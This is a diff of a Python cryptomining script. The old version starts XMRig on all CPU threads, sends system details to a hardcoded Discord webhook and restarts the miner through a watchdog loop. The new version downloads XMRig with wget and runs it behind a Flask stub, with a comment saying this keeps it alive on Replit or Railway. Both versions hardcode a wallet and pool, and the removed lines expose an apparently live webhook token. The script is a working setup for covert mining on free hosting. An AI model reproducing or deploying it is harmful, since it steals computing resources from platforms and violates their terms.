@@ -1,84 +1,47 @@
 import os
 import subprocess
-import time
-import requests
+from flask import Flask
+import threading
 
-# Configuration (Webhook and Pool Information)
-WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Replace with actual webhook
-WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.sucker0001"  # Replace with your Monero wallet
-POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool
+app = Flask(__name__)
 
-# Paths for xmrig
-XM_DIR = "/app"  # Root directory where xmrig is stored
-XM_BIN = os.path.join(XM_DIR, "xmrig")
+# CONFIG
+WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"
+POOL = "fr.zephyr.herominers.com:1123"
+ALGO = "rx/0"
+PASS = "web"
 
-# Ensure the directory for xmrig exists (it's where the binary is)
-os.makedirs(XM_DIR, exist_ok=True)
+def install_and_run_miner():
+    os.makedirs("miner", exist_ok=True)
+    os.chdir("miner")
 
-def start_miner(threads):
-    """Start mining process with maximum threads."""
-    cmd = [XM_BIN, "-o", POOL, "-u", WALLET, "--donate-level", "1", "-k", "-t", str(threads)]
-    try:
-        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
-    except Exception as e:
-        notify(f"❌ Miner failed to start:\n```{e}```")
-        return False
+    if not os.path.exists("xmrig"):
+        print("[*] Downloading XMRig...")
+        os.system("wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz")
+        os.system("tar -xf xmrig-6.24.0-linux-static-x64.tar.gz")
+        os.system("mv xmrig-6.24.0/xmrig ./")
+        os.system("chmod +x xmrig")
+    
+    threads = os.cpu_count() or 1
+    print(f"[*] Starting XMRig with {threads} threads...")
+    subprocess.Popen([
+        "./xmrig",
+        "-a", ALGO,
+        "-o", POOL,
+        "-u", WALLET,
+        "-p", PASS,
+        "--threads", str(threads),
+        "--cpu-priority", "5"
+    ])
 
-def notify(message):
-    """Send a notification to Discord via webhook."""
-    try:
-        requests.post(WEBHOOK, json={"content": message})
-    except Exception as e:
-        print(f"Failed to send notification: {e}")
+@app.route('/')
+def home():
+    return "XMRig Miner Running in Background"
 
-def system_info():
-    """Get system information to optimize mining setup."""
-    try:
-        import platform
-        system = platform.system()
-        if system == "Windows":
-            cpu = subprocess.getoutput("wmic cpu get caption")
-            ram = subprocess.getoutput("systeminfo | findstr /C:'Total Physical Memory'")
-        else:
-            cpu = subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip()
-            ram = subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip()
-        return {"OS": system, "CPU": cpu, "RAM": ram, "Threads": str(os.cpu_count())}
-    except Exception as e:
-        return {"error": str(e)}
+if __name__ == '__main__':
+    # Launch mining in background
+    t = threading.Thread(target=install_and_run_miner)
+    t.start()
 
-def is_miner_running():
-    """Check if the miner is running by inspecting active processes."""
-    try:
-        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
-        return "xmrig" in output
-    except Exception as e:
-        return False
-
-def main():
-    # Check if xmrig exists at the given path
-    if not os.path.exists(XM_BIN):
-        notify(f"❌ XMRig binary not found at {XM_BIN}")
-        return
-
-    # Get system information and determine available threads
-    sysinfo = system_info()
-    info_str = "\n".join([f"{k}: {v}" for k, v in sysinfo.items()])
-    notify(f"✅ Shapeshifter Miner Initialized\n```{info_str}```")
-
-    # Start miner with maximum threads (all available cores)
-    threads = os.cpu_count()  # Use all threads available
-    if start_miner(threads):
-        notify(f"✅ Miner started using {threads} threads.")
-    else:
-        notify("❌ Miner failed to start.")
-
-    # Watchdog loop to keep the miner running
-    while True:
-        time.sleep(60)  # Just a simple delay to keep the script running
-        if not is_miner_running():
-            notify("🔁 Miner not found. Restarting...")
-            start_miner(threads)
-
-if __name__ == "__main__":
-    main()
+    # Keep server alive for Replit or Railway
+    app.run(host='0.0.0.0', port=8080)
